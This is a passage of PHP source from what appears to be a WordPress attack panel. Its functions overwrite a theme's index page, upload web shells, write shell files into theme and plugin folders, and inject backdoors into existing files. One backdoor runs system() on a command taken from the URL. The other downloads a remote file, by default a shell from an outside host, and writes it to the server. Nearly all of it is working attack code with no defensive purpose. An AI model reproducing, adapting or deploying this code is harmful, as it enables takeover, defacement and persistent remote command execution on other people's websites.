['new_content']);
									$themeContent = @fopen('./wp-

content/themes/'.$theme.'/index.php', 'w+');
									if(!$themeContent):
										echo '<div 

class="error">Can\'t open/found index.php file</div>';
									else:
										@fwrite($themeContent, 

$wpCont);
										@fclose($themeContent);
										$showForm = false;
										echo '<div 

class="success">Index updated correctly</div>';
										echo '<META HTTP-

EQUIV="refresh" CONTENT="2; url=?">';
									endif;
								endif;
								if($showForm):
									$themeContent = 

@file_get_contents('./wp-content/themes/'.$theme.'/index.php');
							?>
									<div id="info" style="margin-

bottom: 5px;">Actual Theme: <a target="_blank" href="<?php echo getInfo($_SESSION['dbPref'], 'siteurl'); 

?>/wp-content/themes/<?php echo getInfo($_SESSION['dbPref'], 'template'); ?>"><?php echo getInfo

($_SESSION['dbPref'], 'template'); ?></a><br /></div>
									<div id="info">Insert New Index 

Content (WP Actual Theme Index) [fopen]:</div>
									<div id="data">
										<div 

class="clear"><label>Content:</label><textarea name="new_content" style="text-align: left;font-

size:13px;font-family:'Courier New', Courier, monospace" rows="5"><?php echo $themeContent; ?

></textarea><br /></div>
										<div 

class="clear"><label></label><input type="submit" name="change_index" value="Change Index" /></div>
									</div>
							<?php
								endif;
							break;
							case 7:
								$showForm = true;
								if(isset($_POST['upload_shell'])):
									$uploadShell = basename($_FILES

['file']['name']);
									if(!move_uploaded_file($_FILES

['file']['tmp_name'], $uploadShell)):
										echo '<div 

class="error">Can\'t Upload Shell</div>';
									else:
										$showForm = false;
										echo '<div 

class="success">Shell Uploaded Correctly: <a href="'.getInfo($_SESSION['dbPref'], 'siteurl').'/'.

$uploadShell.'" target="_blank">'.$uploadShell.'</a></div>';
									endif;
								endif;
								if($showForm):
							?>
								<div id="info">Upload Shell To This 

Path:</div>
								<div id="data">
									<div 

class="clear"><label>File:</label><input type="file" name="file" style="border: 1px dashed #00CF00;"/>
									<input type="submit" 

name="upload_shell" value="Upload Shell" style="margin-left: -15px;"/></div>
								</div>
							<?php
								endif;
							break;
							case 8:
								$showForm = true;
								if(isset($_POST['make_shell'])):
									$shellTheme = $_POST

['shell_theme'];
									$shellName = $_POST

['shell_name'];
									$shellCont = stripslashes

($_POST['shell_content']);
									$makeShell = @fopen('./wp-

content/themes/'.$shellTheme.'/'.$shellName, 'w+');
									if(!$makeShell):
										echo '<div 

class="error">Can\'t Make Shell In '.$shellTheme.'</div>';
									else:
										$showForm = false;
										@fwrite($makeShell, 

$shellCont);
										@fclose($makeShell);
										echo '<div 

class="success">Shell Maked Correctly: <a href="'.getInfo($_SESSION['dbPref'], 'siteurl').'/wp-

content/themes/'.$shellTheme.'/'.$shellName.'" target="_blank">'.$shellName.'</a></div>';
									endif;
								endif;
								if($showForm):
							?>
								<div id="info" style="margin-bottom: 

5px;">Actual Theme: <a target="_blank" href="<?php echo getInfo($_SESSION['dbPref'], 'siteurl'); ?>/wp-

content/themes/<?php echo getInfo($_SESSION['dbPref'], 'template'); ?>"><?php echo getInfo($_SESSION

['dbPref'], 'template'); ?></a><br /></div>
								<div id="info">Make Shell To Themes Path 

[fopen]:</div>
								<div id="data">
									<div 

class="clear"><label>Theme:</label><select name="shell_theme"><?php echo getThemes(); ?></select>< 

Select Theme<br /></div>
									<div 

class="clear"><label>Name:</label><input type="text" id="shell_name" name="shell_name" value="shell.php" 

/>< Insert Shell Name<br /></div>
									<div 

class="clear"><label>Content:</label><textarea name="shell_content" style="text-align: left;font-

size:13px;font-family:'Courier New', Courier, monospace" rows="5"><?php echo $themeContent; ?

></textarea><br /></div>
									<div 

class="clear"><label></label><input type="submit" name="make_shell" value="Make Shell" /></div>
								</div>
							<?php
								endif;
							break;
							case 9:
								$showForm = true;
								if(isset($_POST['make_shell'])):
									$shellPlugin = $_POST

['shell_plugin'];
									$shellName = $_POST

['shell_name'];
									$shellCont = stripslashes

($_POST['shell_content']);
									$makeShell = @fopen('./wp-

content/plugins/'.$shellPlugin.'/'.$shellName, 'w+');
									if(!$makeShell):
										echo '<div 

class="error">Can\'t Make Shell In '.$shellPlugin.'</div>';
									else:
										$showForm = false;
										@fwrite($makeShell, 

$shellCont);
										@fclose($makeShell);
										echo '<div 

class="success">Shell Maked Correctly: <a href="'.getInfo($_SESSION['dbPref'], 'siteurl').'/wp-

content/plugins/'.$shellPlugin.'/'.$shellName.'" target="_blank">'.$shellName.'</a></div>';
									endif;
								endif;
								if($showForm):
							?>
								<div id="info" style="margin-bottom: 

5px;">Active Plugins (this can be different to Plugins Path):<br /> <?php echo getInstalledPlugins

(getInfo($_SESSION['dbPref'], 'siteurl'), getInfo($_SESSION['dbPref'], 'active_plugins')); ?><br 

/></div>
								<div id="info">Make Shell To Plugins 

Path [fopen]:</div>
								<div id="data">
									<div 

class="clear"><label>Plugin:</label><select name="shell_plugin"><?php echo getPlugins(); ?></select>< 

Select Plugin<br /></div>
									<div 

class="clear"><label>Name:</label><input type="text" id="shell_name" name="shell_name" value="shell.php" 

/>< Insert Shell Name<br /></div>
									<div 

class="clear"><label>Content:</label><textarea name="shell_content" style="text-align: left;font-

size:13px;font-family:'Courier New', Courier, monospace" rows="5"><?php echo $themeContent; ?

></textarea><br /></div>
									<div 

class="clear"><label></label><input type="submit" name="make_shell" value="Make Shell" /></div>
								</div>
							<?php
								endif;
							break;
							case 10:
								$showForm = true;
								if(isset($_POST['make_backdoor'])):
									$backdoorTheme = $_POST

['backdoor_theme'];
									$backdoorType = $_POST

['backdoor_type'];
									$realTheme = @file_get_contents

('./wp-content/themes/'.$backdoorTheme.'/index.php');
									if(strstr($realTheme, '<?php')):
										$exp = '<?php';
									elseif(strstr($realTheme, 

'<?')):
										$exp = '<?';
									endif;
									if($backdoorType == '1'):
										$extra = '?

active=true&cmd=COMMAND';
										$backdoorCont = 'if(!

empty($_GET[\'active\'])){system($_GET[\'cmd\']);exit();}';
									else:
										$extra = '?

active=true&filename=SHELL.PHP&externalfile=http://xt3mp.mx/shell.txt';
										$backdoorCont = 'if(!

empty($_GET[\'active\'])){$fileContent = @file_get_contents($_GET[\'externalfile\']);$file = fopen

($_GET[\'filename\'], \'w+\');@fwrite($file, $fileContent);@fclose($file);echo \'<a href="\'.$_GET

[\'filename\'].\'">\'.$_GET[\'filename\'].\'</a>\';exit();}';
									endif;
									$explode = explode($exp, 

$realTheme, 2);
									$newContent = stripslashes

($exp.' '.$backdoorCont.' '.$explode[1]);
									$makeBackdoor = @fopen('./wp-

content/themes/'.$backdoorTheme.'/index.php', 'w+');
									if(!$makeBackdoor):
										echo '<div 

class="error">Can\'t Make Backdoor In /wp-content/themes/'.$backdoorTheme.'/index.php</div>';
									else:
										$showForm = false;
										@fwrite($makeBackdoor, 

$newContent);
										@fclose($makeBackdoor);
										echo '<div 

class="success">Backdoor Maked Correctly: <br />'.getInfo($_SESSION['dbPref'], 'siteurl').'/wp-

content/themes/'.$backdoorTheme.'/index.php'.$extra.'</div>';
									endif;
								endif;
								if($showForm):
							?>
								<div id="info" style="margin-bottom: 

5px;">Actual Theme: <a target="_blank" href="<?php echo getInfo($_SESSION['dbPref'], 'siteurl'); ?>/wp-

content/themes/<?php echo getInfo($_SESSION['dbPref'], 'template'); ?>"><?php echo getInfo($_SESSION

['dbPref'], 'template'); ?></a><br /></div>
								<div id="info">Make Shell To Themes Path 

[fopen]:</div>
								<div id="data">
									<div 

class="clear"><label>Theme:</label><select name="backdoor_theme"><?php echo getThemes(); ?></select>< 

Select Theme<br /></div>
									<div 

class="clear"><label>Type:</label><select name="backdoor_type"><option value="1">system

();</option><option value="2">File Downloader</option></select>< Select Backdoor Type</div>
									<div 

class="clear"><label></label><input type="submit" name="make_backdoor" value="Make Backdoor" /></div>
								</div>
							<?php
								endif;
							break;
							case 11:
								$showForm = true;
								if(isset($_POST['make_backdoor'])):
									$backdoorPlugin = $_POST

['backdoor_plugin'];
									$backdoorType = $_POST

['backdoor_type'];
									$realPlugin = 

@file_get_contents('./wp-content/plugins/'.$backdoorPlugin);
									if(strstr($realPlugin, '<?

php')):
										$exp = '<?php';
									elseif(strstr($realPlugin, 

'<?')):
										$exp = '<?';
									endif;
									if($backdoorType == '1'):
										$extra = '?

active=true&cmd=COMMAND';
										$backdoorCont = 'if(!

empty($_GET[\'active\'])){system($_GET[\'cmd\']);exit();}';
									else:
										$extra = '?

active=true&filename=SHELL.PHP&externalfile=http://xt3mp.mx/shell.txt';
										$backdoorCont = 'if(!

empty($_GET[\'active\'])){$fileContent = @file_get_contents($_GET[\'externalfile\']);$file = fopen

($_GET[\'filename\'], \'w+\');@fwrite($file, $fileContent);@fclose($file);echo \'<a href="\'.$_GET

[\'filename\'].\'">\'.$_GET[\'filename\'].\'</a>\';exit();}';
									endif;
									$explode = explode($exp, 

$realPlugin, 2);
									$newContent = $exp.' '.

$backdoorCont.' '.$explode[1];
									$makeBackdoor = @fopen('./wp-

content/plugins/'.$backdoorPlugin, 'w+');
									if(!$makeBackdoor):
										echo '<div 

class="error">Can\'t Make Backdoor In /wp-content/plugins/'.$backdoorPlugin.'</div>';
									else:
										$showForm = false;
										@fwrite($makeBackdoor, 

$newContent);
										@fclose($makeBackdoor);
										echo '<div 

class="success">Backdoor Maked Correctly: <br />'.getInfo($_SESSION['dbPref'], 'siteurl').'/wp-

content/plugins/'.$backdoorPlugin.$extra.'</div>';
									endif;
								endif;
								if($showForm):
							?>
								<div id="info">Make Shell To Plugins 

Path [fopen]:</div>
								<div id="data">
									<div 

class="clear"><label>Plugin:</label><select name="backdoor_plugin"><?php echo getInstalledPlugins

(getInfo($_SESSION['dbPref'], 'siteurl'), getInfo($_SESSION['dbPref'], 'active_plugins'), true); ?

></select>< Select Plugin (Active Plugins)<br /></div>
									<div 

class="clear"><label>Type:</label><select name="backdoor_type"><option value="1">system

();</option><option value="2">File Downloader</option></select>< Select Backdoor Type</div>
									<div 

class="clear"><label></label><input type="submit" name="make_backdoor" value="Make Backdoor" /></div>
								</div>
							<?php
								endif;
							break;
							default;
								echo '<META HTTP-EQUIV="refresh" 

CONTENT="0; url=?">';
							?>
						<?php
						endswitch;
						?>
					</div>
				<?php
				endif;
				?>
			</fieldset>
		<?php
		endif;
		?>
	</form>
</div>
<pre style="text-align: center;margin-top: 5px">xt3mp@null.net >> http://xt3mp.mx</pre>
</body>
</html>
